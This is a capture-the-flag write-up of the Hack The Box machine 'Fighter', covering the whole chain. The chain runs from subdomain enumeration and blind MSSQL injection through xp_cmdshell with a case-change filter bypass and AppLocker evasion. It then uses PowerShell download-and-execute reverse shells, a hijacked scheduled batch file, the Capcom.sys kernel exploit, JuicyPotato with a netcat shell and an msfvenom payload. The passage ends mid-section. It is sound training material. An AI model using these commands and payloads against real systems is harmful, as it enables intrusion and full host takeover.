<h2 id="attack-chain">Attack chain</h2>
<p>Fighter starts with DNS and web enumeration before moving into Windows privilege escalation.</p>
<h3 id="reconnaissance-is-90-of-the-game">Reconnaissance is 90% of the Game</h3>
<p>You cannot exploit what you don't know exists. Every open port, every DNS name, every hidden directory is a potential entry point. The goal of recon isn't to "hack" anything yet - it's to build a <strong>map of the target's attack surface</strong>.</p>
<h3 id="follow-the-clues">Follow the Clues</h3>
<p>When a website says "our old members site is still available... you know the link," that's not flavor text. That's the box creator <strong>telling you</strong> there's something to find. In real-world penetration testing, developers and users leak information constantly. Learn to recognize hints.</p>
<h3 id="assume-nothing-verify-everything">Assume Nothing, Verify Everything</h3>
<p>Just because a login form looks secure doesn't mean it is. Just because <code>xp_cmdshell</code> returns an error doesn't mean it's disabled. Just because PowerShell is "blocked" doesn't mean you can't find another way to run it. Hackers are persistent because they test assumptions.</p>
<h3 id="understand-the-environment">Understand the Environment</h3>
<p>Windows boxes have unique characteristics: AppLocker, Windows Firewall, User Account Control, service accounts with specific privileges, scheduled tasks, and vulnerable drivers. Understanding the <strong>Windows ecosystem</strong> is crucial for privilege escalation.</p>
<hr>
<h2 id="step-1-network-reconnaissance">Step 1: Network Reconnaissance</h2>

<p>We start by discovering what services are running on the target. We use <code>nmap</code> to scan all 65,535 TCP ports.</p>

<p>Every open port is a potential entry point. A web server might have a vulnerable application. A database might have weak credentials. An SMB share might expose sensitive files. We scan <strong>all ports</strong> because services sometimes run on non-standard ports to "hide" from casual scans.</p>

<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash"># Full port scan (SYN stealth scan, fast)
sudo nmap -Pn -sS -p- --min-rate=5000 10.129.228.121

# Service version detection on discovered port
sudo nmap -Pn -sC -sV -p80 10.129.228.121
</code></pre>
<h3 id="the-results">The Results</h3>
<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>

<p><strong>Only one port open.</strong> On Hack The Box, this is common. It means our entry point is almost certainly the web server. IIS 8.5 tells us this is likely <strong>Windows Server 2012 R2</strong>. This OS knowledge becomes critical later when we exploit the Capcom driver - we need to know what exploits are compatible.</p>
<p>The <code>TRACE</code> method being available is a minor information disclosure (XST attack potential), but not our main path.</p>
<hr>
<h2 id="step-2-web-enumeration-and-subdomain-discovery">Step 2: Web Enumeration &amp; Subdomain Discovery</h2>

<p>We visit the website and read every word on it. We also add the domain to <code>/etc/hosts</code> and look for subdomains.</p>

<p>Modern web applications often use <strong>virtual hosts</strong> (vhosts) to serve different content on the same IP address. The main site might be a decoy, while a subdomain hosts the actual application. The hint on the homepage about "members" and "knowing the link" is a dead giveaway.</p>

<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash"># Add domain to /etc/hosts so our browser resolves it
echo "10.129.228.121 streetfighterclub.htb members.streetfighterclub.htb" | sudo tee -a /etc/hosts

# Fuzz for subdomains using wfuzz
wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --hh 6911
</code></pre>
<h3 id="the-results-2">The Results</h3>
<p>The main site is a fan page for Street Fighter. The top post says:</p>
<blockquote>
<p>"We're currently redesigning our website streetfighterclub.htb for a new modern look and functionality. The new site should be up and running soon. Meanwhile our "old" members site is still available for our registered members (p.s you know the link...)"</p>
</blockquote>
<p><code>wfuzz</code> discovers:</p>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>000000134:   403        29 L     92 W     1233 Ch     "members"
</code></pre>

<p><strong>The hint is the attack vector.</strong> The phrase "you know the link" is classic CTF/box design - it tells you that the path isn't obvious and needs to be discovered. The <code>403 Forbidden</code> on <code>members.streetfighterclub.htb</code> means the subdomain exists but we can't access the root. We need to <strong>brute-force directories</strong> on this subdomain.</p>
<p>A <code>403</code> is actually <strong>good news</strong>- it confirms the vhost is configured and serving something. A non-existent subdomain would return the same content as the main site (or a different error).</p>
<hr>
<h2 id="step-3-finding-the-login-page">Step 3: Finding the Login Page</h2>

<p>We run a directory brute-force scan on the members subdomain to find hidden pages.</p>

<p>Web servers have default behaviors. IIS servers often host <code>.asp</code> and <code>.aspx</code> files. The <code>403</code> on the root of <code>members</code> suggests there's content behind it, but we need to guess the path.</p>

<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">feroxbuster -u http://members.streetfighterclub.htb \
  -x aspx,asp,html \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  --no-recursion
</code></pre>
<h3 id="the-results-3">The Results</h3>
<pre tabindex="0" aria-label="Code or terminal block 6"><code>301      GET        2l       10w      164c http://members.streetfighterclub.htb/old =&gt; http://members.streetfighterclub.htb/old/
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/welcome.asp =&gt; Login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/verify.asp =&gt; login.asp
</code></pre>

<p><strong>Patterns reveal architecture.</strong> We see:</p>
<ul>
<li><code>login.asp</code> : the entry point</li>
<li><code>verify.asp</code> : likely handles the POST request</li>
<li><code>welcome.asp</code> : likely the post-login page</li>
</ul>
<p>The <code>302</code> redirects tell us the flow: <code>login.asp</code> → POST to <code>verify.asp</code> → redirect to <code>welcome.asp</code> (or back to <code>login.asp</code> on failure).</p>
<p>We now know we're dealing with <strong>Classic ASP</strong> (not ASP.NET), which historically has had many SQL injection vulnerabilities because developers often concatenated user input directly into SQL queries.</p>
<hr>
<h2 id="step-4-discovering-sql-injection">Step 4: Discovering SQL Injection</h2>

<p>We analyze the login form's HTTP request and test each parameter for SQL injection.</p>

<p>Login forms are prime targets for SQL injection because they almost always query a database to validate credentials. If the query is constructed unsafely, we can manipulate it.</p>
<h3 id="the-analysis">The Analysis</h3>
<p>Using <code>curl</code> or Burp Suite, we capture the POST request:</p>
<pre tabindex="0" aria-label="http code or terminal block 7"><code class="language-http" data-language="http">POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
Content-Type: application/x-www-form-urlencoded

username=admin&amp;password=REDACTED&amp;logintype=2&amp;rememberme=ON&amp;B1=LogIn
</code></pre>
<p>We notice:</p>
<ul>
<li><code>username</code> and <code>password</code> are base64-encoded in the response cookies</li>
<li><code>logintype=2</code> (user login), <code>logintype=1</code> (administrator login)</li>
</ul>
<h3 id="testing-for-sql-injection">Testing for SQL Injection</h3>
<p>We test each parameter. The <code>username</code> and <code>password</code> fields reflect our input in cookies but don't seem to cause errors with weird input. However, <code>logintype</code> is different.</p>
<p><strong>Test 1: Normal login</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&amp;password=REDACTED&amp;logintype=2&amp;rememberme=ON&amp;B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 302
</code></pre>
<p><strong>Test 2: SQL comment syntax</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&amp;password=REDACTED&amp;logintype=1--+-x&amp;rememberme=ON&amp;B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 302
</code></pre>
<p><strong>Test 3: Invalid input (no SQL)</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&amp;password=REDACTED&amp;logintype=abc&amp;rememberme=ON&amp;B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 500 (Internal Server Error)
</code></pre>

<p><strong>Error messages are information.</strong> The <code>500</code> error when <code>logintype=abc</code> tells us the application expects a number and crashes when it gets text. But when we send <code>1--+-x</code> (a number followed by a SQL comment), it returns <code>302</code>- the same as a successful login.</p>
<p>This means the SQL query looks something like:</p>
<pre tabindex="0" aria-label="sql code or terminal block 11"><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password='REDACTED' AND logintype=2
</code></pre>
<p>When we send <code>1--+-x</code>, it becomes:</p>
<pre tabindex="0" aria-label="sql code or terminal block 12"><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username='admin' AND password='REDACTED' AND logintype=1--+-x
</code></pre>
<p>The <code>--</code> comments out the rest of the query, and the <code>1</code> makes the <code>WHERE</code> clause true (assuming the user exists). The <code>302</code> redirect means the query returned rows -<strong>we have SQL injection</strong>.</p>
<p><strong>Why <code>logintype</code> and not <code>username</code>?</strong> Because <code>username</code> and <code>password</code> are likely wrapped in quotes in the SQL query, so our input is treated as a string. But <code>logintype</code> is used as a raw number, so we can inject SQL operators directly.</p>
<hr>
<h2 id="step-5-exploiting-sql-injection-with-stacked-queries">Step 5: Exploiting SQL Injection with Stacked Queries</h2>

<p>We confirm we can execute arbitrary SQL commands using <strong>stacked queries</strong> (multiple queries separated by <code>;</code>).</p>

<p>Classic ASP with MSSQL is notorious for allowing stacked queries by default. This means if we can inject <code>;</code>, we can run entirely new SQL commands - including system commands via <code>xp_cmdshell</code>.</p>
<h3 id="understanding-stacked-queries">Understanding Stacked Queries</h3>
<p>In MySQL, stacked queries are often disabled. But in <strong>Microsoft SQL Server with ASP/ADO</strong>, they're frequently enabled. This is a critical distinction. A stacked query attack looks like:</p>
<pre tabindex="0" aria-label="sql code or terminal block 13"><code class="language-sql" data-language="sql">SELECT * FROM users WHERE logintype=3; EXEC xp_cmdshell 'whoami'; -- -
</code></pre>
<p>The database executes:</p>
<ol>
<li>The original <code>SELECT</code></li>
<li>Our injected <code>EXEC xp_cmdshell 'whoami'</code></li>
</ol>
<h3 id="confirming-stacked-queries-work">Confirming Stacked Queries Work</h3>
<p>We can't easily see the output (blind injection), so we use a <strong>time-based or network-based</strong> confirmation. The classic approach is <code>ping</code>- if we see ICMP packets, our command executed.</p>
<p><strong>Start tcpdump to watch for pings:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">sudo tcpdump -ni tun0 icmp
</code></pre>
<p><strong>Send the stacked query:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=REDACTED" \
  --data-urlencode "logintype=3;EXEC xp_cmDshElL 'ping 10.10.16.84'-- -" \
  -d "rememberme=ON&amp;B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
</code></pre>
<p><strong>Result:</strong> <code>302</code> HTTP code, and <code>tcpdump</code> shows ICMP echo requests from <code>10.129.228.121</code>.</p>

<p><strong>Blind injection doesn't mean helpless.</strong> Even though we don't see command output in the HTTP response, we can confirm execution through side effects:</p>
<ul>
<li><strong>Network effects:</strong> DNS lookups, pings, HTTP requests to our server</li>
<li><strong>Time delays:</strong> <code>WAITFOR DELAY '0:0:5'</code> makes the response take 5 seconds</li>
<li><strong>File system:</strong> Write files we can read later</li>
</ul>
<p>The <code>ping</code> is our "canary" - it proves we have arbitrary command execution.</p>
<hr>
<h2 id="step-6-waf-bypass-and-xp-cmdshell">Step 6: WAF Bypass &amp; xp_cmdshell</h2>

<p>We discover that a Web Application Firewall (WAF) or filtering mechanism blocks <code>xp_cmdshell</code> in normal case, but <strong>mixed case</strong> bypasses it.</p>
<h3 id="why-this-happens">Why This Happens</h3>
<p>Many security filters use simple string matching. If the filter looks for <code>xp_cmdshell</code> (lowercase), changing the case to <code>xp_cmDshElL</code> bypasses the filter while MSSQL still recognizes it (SQL Server is case-insensitive for commands).</p>
<h3 id="the-evidence">The Evidence</h3>
<table tabindex="0" aria-label="The Evidence data table">
<thead>
<tr>
<th scope="col">Payload</th>
<th scope="col">Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>3;EXEC xp_cmdshell 'ping ...'</code></td>
<td><code>500</code> Error</td>
</tr>
<tr>
<td><code>3;EXEC xp_cmdshell "ping ..."</code></td>
<td><code>302</code> Instantly, no ping</td>
</tr>
<tr>
<td><code>3;EXEC xp_cmDshElL "ping ..."</code></td>
<td><code>302</code> After 5 seconds, ping received!</td>
</tr>
</tbody></table>

<p><strong>Filters are dumb; databases are smart.</strong> WAFs often block known attack signatures, but the underlying database doesn't care about case. This is why <strong>encoding, case manipulation, and comment insertion</strong> are classic bypass techniques.</p>
<p>Test variations:</p>
<ul>
<li>Uppercase/lowercase/mixed case</li>
<li>URL encoding (<code>%20</code> instead of space)</li>
<li>Double encoding</li>
<li>Unicode normalization</li>
<li>Comment insertion (<code>xp_/*foo*/cmdshell</code>)</li>
</ul>
<hr>
<h2 id="step-7-getting-a-shell-as-sqlserv">Step 7: Getting a Shell as sqlserv</h2>

<p>We use <code>xp_cmdshell</code> to execute a PowerShell reverse shell.</p>
<h3 id="why-we-use-powershell">Why We Use PowerShell</h3>
<p>PowerShell is deeply integrated into Windows and can easily create network connections, download files, and execute complex scripts. It's the ideal payload delivery mechanism on Windows targets.</p>
<h3 id="the-first-obstacle-applocker">The First Obstacle: AppLocker</h3>
<p>We try to run PowerShell:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 16"><code class="language-powershell" data-language="powershell">powershell.exe -c "ping 10.10.16.84"
</code></pre>
<p>Nothing happens.</p>
<p>We try the full path:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 17"><code class="language-powershell" data-language="powershell">C:\Windows\system32\windowspowershell\v1.0\powershell.exe -c "ping 10.10.16.84"
</code></pre>
<p>Still nothing.</p>
<p>But the 32-bit version:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 18"><code class="language-powershell" data-language="powershell">C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -c "ping 10.10.16.84"
</code></pre>
<p><strong>It works!</strong></p>
<h3 id="understanding-applocker">Understanding AppLocker</h3>
<p>AppLocker is a Windows application control feature. Administrators can create rules like:</p>
<ul>
<li>"Only allow executables in <code>C:\Windows\System32</code> to run"</li>
<li>"Block PowerShell.exe"</li>
</ul>
<p>However, administrators often forget about:</p>
<ul>
<li><strong>32-bit versions</strong> of programs in <code>SysWow64</code></li>
<li><strong>Trusted directories</strong> like <code>C:\Windows\System32\spool\drivers\color</code></li>
<li><strong>Built-in binaries</strong> like <code>msbuild.exe</code> that can execute code</li>
</ul>
<p>This is a <strong>classic sysadmin mistake</strong>: blocking the obvious path but leaving alternate paths wide open.</p>
<h3 id="the-second-obstacle-windows-firewall">The Second Obstacle: Windows Firewall</h3>
<p>We check the firewall rules:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 19"><code class="language-powershell" data-language="powershell">Get-NetFirewallProfile
Get-NetFirewallRule -Direction Outbound -Enabled True
</code></pre>
<p><strong>All profiles block outbound by default.</strong> Only ports <strong>80</strong> and <strong>443</strong> are allowed out.</p>
<p>This means our reverse shell <strong>must</strong> connect back on port 443 (or 80). Using any other port will fail silently.</p>
<h3 id="the-reverse-shell-setup">The Reverse Shell Setup</h3>
<p><strong>On Kali:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash"># Terminal 1: HTTP server to serve payload
cd /tmp &amp;&amp; sudo python3 -m http.server 80

# Terminal 2: Reverse shell listener
rlwrap -cAr nc -lvnp 443
</code></pre>
<p><strong>Download the Nishang PowerShell reverse shell:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O REV.PS1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.84 -Port 443' &gt;&gt; REV.PS1
</code></pre>
<blockquote>
<p><strong>Why <code>REV.PS1</code> in uppercase?</strong> MSSQL's <code>xp_cmdshell</code> upper-cases the command string before execution. When PowerShell requests <code>rev.ps1</code>, it actually requests <code>REV.PS1</code>. Python's HTTP server is case-sensitive on Linux, so we name the file <code>REV.PS1</code> to match.</p>
</blockquote>
<p><strong>Trigger the shell via SQL injection:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=REDACTED" \
  --data-urlencode "logintype=3;EXEC xp_cmDshElL 'C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe \"iex(new-object net.webclient).downloadstring(\\\"http://10.10.16.84/REV.PS1\\\")\"'-- -" \
  -d "rememberme=ON&amp;B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
</code></pre>
<p><strong>Result:</strong> We catch a shell:</p>
<pre tabindex="0" aria-label="Code or terminal block 23"><code>Windows PowerShell running as user sqlserv on FIGHTER
PS C:\Windows\system32&gt; whoami
fighter\sqlserv
</code></pre>

<p><strong>Know the environment.</strong> If we hadn't checked the firewall, we might have wasted hours trying reverse shells on random ports. If we hadn't tested both 64-bit and 32-bit PowerShell, we might have concluded code execution was impossible.</p>
<p>When something "should work but doesn't," ask:</p>
<ul>
<li>Is there a firewall?</li>
<li>Is there application whitelisting (AppLocker)?</li>
<li>Are there multiple versions of the program?</li>
<li>Is the command being modified (case changes, encoding)?</li>
</ul>
<hr>
<h2 id="step-8-privilege-escalation-to-decoder">Step 8: Privilege Escalation to decoder</h2>

<p>We enumerate the system as <code>sqlserv</code> and find a way to escalate to the <code>decoder</code> user.</p>
<h3 id="system-enumeration">System Enumeration</h3>
<p><strong>Users on the box:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 24"><code class="language-powershell" data-language="powershell">net user
# Output: Administrator, decoder, Guest, sqlserv
</code></pre>
<p><strong>Interesting file:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 25"><code class="language-powershell" data-language="powershell"># C:\users\decoder\clean.bat
@echo off
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp
exit
</code></pre>
<p>This looks like a <strong>scheduled task</strong>- a script that runs periodically to clean up temp files.</p>
<p><strong>Permissions on clean.bat:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 26"><code class="language-powershell" data-language="powershell">icacls clean.bat
# Output: clean.bat Everyone:(M)
</code></pre>
<p><code>Everyone:(M)</code> means <strong>any user can modify this file</strong>.</p>
<h3 id="the-plan">The Plan</h3>
<p>If we can modify <code>clean.bat</code> to run our code instead of (or in addition to) cleaning temp files, the scheduled task will execute it as <code>decoder</code>.</p>
<h3 id="the-obstacles">The Obstacles</h3>
<ol>
<li><p><strong>AppLocker blocks writing <code>.bat</code> files:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 27"><code class="language-powershell" data-language="powershell">echo "test" &gt; clean.bat
# Access denied
</code></pre>
</li>
<li><p><strong>The file has an <code>exit</code> command:</strong> Even if we append to the file, nothing after <code>exit</code> will run.</p>
</li>
</ol>
<h3 id="the-solution-truncate-and-append">The Solution: Truncate and Append</h3>
<p><strong>Truncate the file using <code>copy /y NUL</code>:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 28"><code class="language-powershell" data-language="powershell">cmd /c "copy /y NUL clean.bat"
</code></pre>
<p>Surprisingly, this works! <code>copy NUL file</code> creates an empty file using the <strong>append</strong> permission, which <code>Everyone:(M)</code> grants us.</p>
<p><strong>Plant our payload:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 29"><code class="language-powershell" data-language="powershell">cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.16.84/REV.PS1') &gt;&gt; clean.bat"
</code></pre>
<p>Now <code>clean.bat</code> contains only our reverse shell command.</p>
<h3 id="waiting-for-the-scheduled-task">Waiting for the Scheduled Task</h3>
<p>Scheduled tasks that run every minute are common for cleanup scripts. We wait up to 60 seconds for the task to trigger.</p>
<p><strong>Result:</strong> A new connection on our <code>nc</code> listener:</p>
<pre tabindex="0" aria-label="Code or terminal block 30"><code>Windows PowerShell running as user decoder on FIGHTER
PS C:\Windows\system32&gt; whoami
fighter\decoder
</code></pre>

<p><strong>File permissions are common checks.</strong> In Windows, <code>icacls</code> is your best friend. Check:</p>
<ul>
<li>Who owns files in user directories?</li>
<li>What permissions do service accounts have on scripts?</li>
<li>Are there <code>.bat</code>, <code>.ps1</code>, <code>.vbs</code> files that run automatically?</li>
</ul>
<p>The <code>copy /y NUL</code> trick is a classic <strong>AppLocker bypass</strong> for file truncation. When you can't overwrite a file directly (blocked by extension), truncating via <code>copy</code> uses different Windows APIs that may not be restricted.</p>

<h2 id="step-10-privilege-escalation-to-system">Step 10: Privilege Escalation to SYSTEM</h2>

<p>We discover a vulnerable kernel driver (<code>capcom.sys</code>) and exploit it to gain <code>SYSTEM</code> privileges.</p>
<h3 id="discovery">Discovery</h3>
<p><strong>Check loaded drivers:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 33"><code class="language-powershell" data-language="powershell">driverquery /v | findstr /iv "system32\\drivers"
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 34"><code>Capcom       Capcom                 Capcom                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 1.280       0          05/09/2016 08:43:33    \??\C:\Windows\drivers\Capcom.sys                384
</code></pre>
<p><strong>Why is this suspicious?</strong></p>
<ul>
<li><code>Capcom</code> is a video game company (makes Street Fighter!)</li>
<li>The driver is in <code>C:\Windows\</code> instead of <code>C:\Windows\System32\drivers</code></li>
<li>It's a <strong>third-party kernel driver</strong> on a server - unusual</li>
</ul>
<h3 id="background-the-capcom-sys-vulnerability">Background: The Capcom.sys Vulnerability</h3>
<p>The <code>capcom.sys</code> driver was distributed with Street Fighter 5. It contains a deliberate "feature" that allows user-mode applications to execute arbitrary code in kernel mode. This was intended for anti-cheat purposes but creates a massive security hole.</p>
<p>The vulnerability:</p>
<ol>
<li>The driver exposes an IOCTL that disables SMEP (Supervisor Mode Execution Prevention)</li>
<li>It then executes a user-provided function pointer</li>
<li>Attackers can pass a pointer to their shellcode</li>
<li>The shellcode runs in kernel mode with <code>SYSTEM</code> privileges</li>
</ol>
<h3 id="the-exploit">The Exploit</h3>
<p>We use the <strong>Capcom-Rootkit</strong> PowerShell exploit by FuzzySecurity:</p>
<p><strong>On Kali:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">cd /tmp
git clone https://github.com/FuzzySecurity/Capcom-Rootkit.git
cd Capcom-Rootkit
find . -name "*.ps1" -exec cat {} \; -exec echo \; &gt; /tmp/capcom-all
</code></pre>
<p><strong>On Target (as decoder):</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 36"><code class="language-powershell" data-language="powershell"># Load all the PowerShell functions into our session
iex(new-object net.webclient).downloadstring('http://10.10.16.84/capcom-all')

# Execute the exploit
capcom-elevatepid
</code></pre>
<p><strong>Output:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 37"><code>[+] SYSTEM Token: 0xFFFFC00119E077CA
[+] Found PID: 2044
[+] PID token: 0xFFFFC0011B9A8067
[!] Duplicating SYSTEM token!
</code></pre>
<p><strong>Verify:</strong></p>
<pre tabindex="0" aria-label="powershell code or terminal block 38"><code class="language-powershell" data-language="powershell">whoami
# nt authority\system
</code></pre>

<p><strong>Kernel drivers are high-impact attack surfaces.</strong> Any third-party kernel driver is a potential privilege escalation vector. Here's how to find them:</p>
<ol>
<li><code>driverquery /v</code> : list all drivers</li>
<li>Look for non-Microsoft drivers</li>
<li>Look for drivers in unusual paths</li>
<li>Google the driver name + "exploit" or "vulnerability"</li>
</ol>
<p>The Capcom driver is <strong>famous</strong> in the security community. When you see it, you know it's exploitable. Building a mental database of known-vulnerable drivers (Capcom, DBUtil, RTCore64, etc.) is essential for Windows privilege escalation.</p>
<p><strong>Why PowerShell?</strong> Because AppLocker blocks <code>.exe</code> files, but we're running PowerShell code directly in memory. No file is written to disk, so AppLocker never sees it.</p>

<h2 id="step-11-getting-the-root-flag">Step 11: Getting the Root Flag</h2>
<h3 id="what-we-find">What We Find</h3>
<pre tabindex="0" aria-label="powershell code or terminal block 39"><code class="language-powershell" data-language="powershell">cd C:\users\administrator\desktop
ls
</code></pre>
<p>Output:</p>
<pre tabindex="0" aria-label="Code or terminal block 40"><code>checkdll.dll
root.exe
</code></pre>
<p>No <code>root.txt</code>! The flag is hidden behind a reverse-engineering challenge.</p>
<h3 id="analyzing-root-exe">Analyzing root.exe</h3>
<pre tabindex="0" aria-label="powershell code or terminal block 41"><code class="language-powershell" data-language="powershell">.\root.exe
# Output: C:\users\administrator\desktop\root.exe &lt;password&gt;

.\root.exe wrongpassword
# Output: Sorry, check returned: 0
</code></pre>
<p>The executable:</p>
<ol>
<li>Takes a password argument</li>
<li>Calls <code>check(password)</code> from <code>checkdll.dll</code></li>
<li>If <code>check</code> returns <code>1</code>, prints the flag</li>
<li>If <code>check</code> returns <code>0</code>, prints an error</li>
</ol>
<h3 id="reverse-engineering-checkdll-dll">Reverse Engineering checkdll.dll</h3>
<p>We can copy the files to our web root and download them to Kali for analysis:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 42"><code class="language-powershell" data-language="powershell">copy checkdll.dll C:\inetpub\wwwroot\street\checkdll.dll
copy root.exe C:\inetpub\wwwroot\street\root.exe
</code></pre>
<p><strong>On Kali:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 43"><code class="language-bash" data-language="bash">wget http://members.streetfighterclub.htb/street/checkdll.dll
wget http://members.streetfighterclub.htb/street/root.exe
</code></pre>
<p><strong>Analyzing with Python instead of Ghidra:</strong></p>
<p>The <code>check</code> function in <code>checkdll.dll</code>:</p>
<ol>
<li>Takes a 10-character password</li>
<li>XORs each byte with <code>9</code></li>
<li>Compares against an obfuscated buffer</li>
</ol>
<pre tabindex="0" aria-label="python code or terminal block 44"><code class="language-python" data-language="python">obpass = b'\x46\x6d\x60\x66\x45\x68\x4f\x6c\x7d\x68'
password = ''.join([chr(x ^ 9) for x in obpass])
print(password)  # OdioLaFeta
</code></pre>
<p>The <code>print_flag</code> function in <code>root.exe</code>:</p>
<ol>
<li>Loops over a 32-byte buffer</li>
<li>Subtracts <code>7</code> from each byte</li>
<li>Prints the result</li>
</ol>
<pre tabindex="0" aria-label="python code or terminal block 45"><code class="language-python" data-language="python">obflag = b'\x4b\x3f\x37\x38\x4a\x38\x4c\x40\x49\x4b\x40\x48\x37\x39\x4d\x3f\x4d\x49\x3a\x37\x4b\x3f\x49\x4b\x3a\x49\x4c\x3a\x38\x3b\x4a\x38'
flag = ''.join([chr(x - 7) for x in obflag]).lower()
print(flag)  # d801c1[redacted]3be314c1
</code></pre>
<h3 id="getting-the-flag">Getting the Flag</h3>
<pre tabindex="0" aria-label="powershell code or terminal block 46"><code class="language-powershell" data-language="powershell">.\root.exe OdioLaFeta
</code></pre>
<p><strong>Output:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 47"><code>d801c[redacted]d3be314c1
</code></pre>

<p><strong>Reverse engineering is just following the data.</strong> You don't need to be a binary ninja to solve simple RE challenges:</p>
<ol>
<li>Look for strings (especially error messages)</li>
<li>Find where those strings are referenced</li>
<li>Trace backward to understand the logic</li>
<li>Reconstruct the algorithm in Python</li>
</ol>
<p>In real penetration testing, you might encounter custom authentication binaries, encrypted configuration files, or malware. Understanding basic reverse engineering concepts (XOR, addition/subtraction obfuscation, string analysis) is incredibly valuable.</p>

<h2 id="alternative-paths">Alternative Paths</h2>
<h3 id="juicypotato-token-impersonation">JuicyPotato (Token Impersonation)</h3>
<p>From <code>sqlserv</code> (or <code>decoder</code>), we have <code>SeImpersonatePrivilege</code>:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 48"><code class="language-powershell" data-language="powershell">whoami /priv
# SeImpersonatePrivilege ... Enabled
</code></pre>
<p>JuicyPotato exploits DCOM/RPC to impersonate <code>NT AUTHORITY\SYSTEM</code>. Since BITS is disabled on this box, we use a different CLSID:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 49"><code class="language-powershell" data-language="powershell"># Upload JuicyPotato.exe and nc64.exe to the whitelisted color directory
wget http://10.10.16.84/JuicyPotato.exe -outfile C:\windows\system32\spool\drivers\color\jp.exe
wget http://10.10.16.84/nc64.exe -outfile C:\windows\system32\spool\drivers\color\nc64.exe

# Create a batch file for the reverse shell
cmd /c "echo C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.16.84 443 &gt; rev.bat"

# Execute JuicyPotato with the Windows Management CLSID
C:\windows\system32\spool\drivers\color\jp.exe -t * -p "C:\windows\system32\spool\drivers\color\rev.bat" -l 9001 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
</code></pre>
<h3 id="msbuild-applocker-bypass">MSBuild AppLocker Bypass</h3>
<p><code>msbuild.exe</code> is a trusted Windows binary that executes C# code from XML files. We can embed shellcode in an XML project file:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 50"><code class="language-powershell" data-language="powershell"># Generate C# shellcode with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.84 LPORT=443 -f csharp -v shellcode

# Embed in MSBuild XML template, upload as sc.xml
C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sc.xml
</code></pre>
<h3 id="extensionless-executables">Extensionless Executables</h3>
<p>AppLocker blocks <code>.exe</code> but not extensionless files:</p>
